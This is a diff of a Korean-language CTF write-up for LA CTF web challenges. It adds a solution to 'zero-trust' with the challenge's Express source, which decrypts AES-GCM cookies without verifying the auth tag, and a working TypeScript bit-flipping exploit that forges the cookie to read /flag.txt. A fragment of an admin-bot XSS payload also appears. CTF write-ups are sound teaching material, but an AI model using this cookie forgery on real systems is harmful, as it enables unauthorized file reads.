@@ -15,7 +15,7 @@ draft: true
 ::github{repo="uclaacm/lactf-archive"}
 문제들은 여기서 확인할 수 있다.
 
-`admin bot`은 로컬 환경에서 사용할 수 있도록 `domain`을 수정하였다.
+`admin bot`은 로컬 환경에서 사용할 수 있도록 도메인을 수정하였다.
 
 ## web/college-tour (756 solves, 100 points)
 
@@ -121,7 +121,7 @@ app.get('/friends', needsAuth, (req, res) => {
 
 `bmcyver`라는 계정을 만들고 아래 코드를 포스트하고, `admin bot`이 해당 페이지를 방문하게 하면 된다.
 
-```html title="exploit.html" no-icon
+```html title="exploit.html"
 <script>
   fetch('http://metaverse:8080/friend', {
     method: 'POST',
@@ -550,7 +550,7 @@ I made a new hyper-productive todo list app that limits you to 12 characters per
 
 <!-- TODO: add solution for hptla -->
 
-## web/zero-trust (24 solves, 488 points)
+## ~~web~~crypto/zero-trust (24 solves, 488 points)
 
 :::tip[description]
 I was researching zero trust proofs in cryptography and now I have zero trust in JWT libraries so I rolled my own! That's what zero trust means, right?
@@ -558,4 +558,147 @@ I was researching zero trust proofs in cryptography and now I have zero trust in
 Note: the flag is in `/flag.txt`
 :::
 
-<!-- TODO: add solution for zero-trust -->
+`index.js` 파일을 제공해준다.
+
+```js title="index.js" collapse={1-25, 67-71, 83-98} "aes-256-gcm" {33, 55}
+const express = require('express');
+const path = require('path');
+const fs = require('fs');
+const cookieParser = require('cookie-parser');
+const crypto = require('crypto');
+
+const port = parseInt(process.env.PORT) || 8080;
+
+const key = crypto.randomBytes(32);
+
+const app = express();
+
+const lists = new Map();
+
+setInterval(function () {
+  for (const file of fs.readdirSync('/tmp/pastestore')) {
+    if (
+      Date.now() - fs.statSync('/tmp/pastestore/' + file).mtimeMs >
+      1000 * 60 * 60
+    ) {
+      fs.rmSync('/tmp/pastestore/' + file);
+    }
+  }
+}, 60000);
+
+function makeAuth(req, res, next) {
+  const iv = crypto.randomBytes(16);
+  const tmpfile = '/tmp/pastestore/' + crypto.randomBytes(16).toString('hex');
+  fs.writeFileSync(tmpfile, "there's no paste data yet!", 'utf8');
+  const user = { tmpfile };
+  const data = JSON.stringify(user);
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+  const ct = Buffer.concat([cipher.update(data), cipher.final()]);
+  const authTag = cipher.getAuthTag();
+  res.cookie(
+    'auth',
+    [iv, authTag, ct].map((x) => x.toString('base64')).join('.'),
+  );
+  res.locals.user = user;
+  next();
+}
+
+function needsAuth(req, res, next) {
+  const auth = req.cookies.auth;
+  if (typeof auth !== 'string') {
+    makeAuth(req, res, next);
+    return;
+  }
+  try {
+    const [iv, authTag, ct] = auth
+      .split('.')
+      .map((x) => Buffer.from(x, 'base64'));
+    const cipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+    cipher.setAuthTag(authTag);
+    res.locals.user = JSON.parse(cipher.update(ct).toString('utf8'));
+    if (!fs.existsSync(res.locals.user.tmpfile)) {
+      makeAuth(req, res, next);
+      return;
+    }
+  } catch (err) {
+    makeAuth(req, res, next);
+    return;
+  }
+  next();
+}
+
+app.use(cookieParser());
+app.use(express.urlencoded({ extended: false }));
+app.use(express.static(path.join(__dirname, 'static')));
+
+const template = fs.readFileSync('index.html', 'utf8');
+
+app.get('/', needsAuth, (req, res) => {
+  res
+    .type('text/html')
+    .send(
+      template.replace('$CONTENT', () =>
+        fs.readFileSync(res.locals.user.tmpfile, 'utf8'),
+      ),
+    );
+});
+
+app.post('/update', needsAuth, (req, res) => {
+  if (typeof req.body.content === 'string') {
+    try {
+      fs.writeFileSync(
+        res.locals.user.tmpfile,
+        req.body.content.slice(0, 2048),
+        'utf8',
+      );
+    } catch (err) {}
+  }
+  res.redirect('/');
+});
+
+app.listen(port, () => {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+여기서 집중해야 하는 부분은 `makeAuth`와 `needsAuth` 함수이다.
+각각 `auth` 쿠키를 생성하고, `auth` 쿠키를 확인하는 함수이다.
+`aes-256-gcm`을 사용하여 암호화를 하고 있다.<br>
+그리고, `GET /`에서 `tmpfile`을 읽어온다.
+
+즉, `auth` 쿠키를 조작하여 `tmpfile`를 `/flag.txt`를 가리키도록 만들어 `flag`을 읽어올 수 있다.
+
+그런데, `aes-256-gcm`을 사용하고 있기 때문에 어떻게 `auth` 쿠키를 조작하기에는 어려움이 있어 보였다.
+그러나, `needsAuth`에서 `cipher.final`을 호출하고 있지 않기 때문에, **인증 태그 검증 없이 암호문을 복호화**하기 때문에 이를 악용하여 `auth` 쿠키를 조작할 수 있다.
+
+```typescript title="exploit.ts"
+import { logger } from '@utils';
+import { create } from '@web';
+
+const r = create({
+  baseURL: 'http://localhost:8080',
+  ignoreHttpErrors: true,
+});
+
+await r.get('/');
+
+const [iv, authTag, ct] = (r.getCookie('auth') as string)
+  .split('.')
+  .map((v) => Buffer.from(v, 'base64'));
+
+const target = `{"tmpfile":"/flag.txt","a":"`;
+const origin = `{"tmpfile":"/tmp/pastestore/`;
+
+for (let i = 0; i < target.length; i++) {
+  ct[i] = ct[i] ^ target[i].charCodeAt(0) ^ origin[i].charCodeAt(0);
+}
+
+r.setCookie(
+  'auth',
+  `${iv.toString('base64')}.${authTag.toString('base64')}.${ct.toString('base64')}`,
+);
+
+await r.get('/').then((res) => logger.flag(res.data.match(/lactf{.*}/)));
+```
+
+`lactf{m4yb3_st1ck_t0_l1br4r1es_wr1tt3n_by_comp3t3nt_p3opl3}`
